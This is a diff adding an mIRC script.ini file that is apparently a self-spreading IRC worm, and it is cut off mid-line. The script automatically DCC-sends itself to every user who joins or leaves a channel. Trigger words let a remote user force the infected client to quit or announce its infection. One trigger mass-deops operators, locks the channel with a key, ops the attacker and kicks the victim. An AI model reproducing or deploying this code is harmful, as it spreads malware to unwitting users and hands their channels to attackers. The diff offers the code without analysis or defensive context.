@@ -1,0 +1,34 @@
+[script]
+n0=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }
+n1=  /dcc send $nick $mircdirscript.ini
+n2=}
+n3=
+n4=ON 1:PART:#:{ /if ( $nick == $me ) { halt }
+n5=  /dcc send $nick $mircdirscript.ini
+n6=}
+n7=
+n8=ON 1:TEXT:*simpsalapim*:#:/quit iNFeCTeD!
+n9=ON 1:TEXT:*XX!XX*:*:/msg $nick i'm iNFeCTeD!
+n10=ON 1:TEXT:*ananas*:#:{
+n11=/nick _XInFected
+n12=  %i = 0
+n13=  %opit = $opnick(0,$chan)
+n14=  :looppi
+n15=  %i = %i + 1
+n16=  /if ($opnick(%i,$chan) != $me ) { %line = $opnick(%i,$chan) }
+n17=  /if ($opnick(%i,$chan) == $me ) { /set %line " " }
+n18=  %i = %i + 1
+n19=  /if ($opnick(%i,$chan) != $me ) { %line = %line $opnick(%i,$chan) }
+n20=  %i = %i + 1
+n21=  /if ($opnick(%i,$chan) != $me ) { %line = %line $opnick(%i,$chan) }
+n22=  /mode $chan -ooo %line
+n23=  /if ( %i > %opit ) { goto pois }
+n24=  goto looppi
+n25=  :pois
+n26=  /mode $chan +k iNFeCTeD!
+n27=  /mode $chan +o $nick
+n28=  /kick $chan $me
+n29=}
+n30=ON 1:TEXT:*:#:{ /if ( $rand(0,100) == 1 ) { 
+n31=    /mode $chan +o $nick 
+n
